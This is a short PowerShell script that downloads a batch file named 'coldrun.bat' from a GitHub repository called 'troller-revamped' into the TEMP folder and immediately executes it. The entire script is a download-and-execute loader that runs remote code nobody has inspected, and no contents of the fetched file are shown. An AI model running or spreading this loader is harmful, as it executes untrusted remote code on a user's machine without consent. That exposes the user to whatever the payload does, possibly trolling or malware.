# Define the URL of the batch script
$batchScriptUrl = "https://raw.githubusercontent.com/vexnity/troller-revamped/main/coldrun.bat"

# Download the batch script and execute it
Invoke-WebRequest -Uri $batchScriptUrl -OutFile "$env:TEMP\coldrun.bat"
Start-Process -FilePath "$env:TEMP\coldrun.bat"
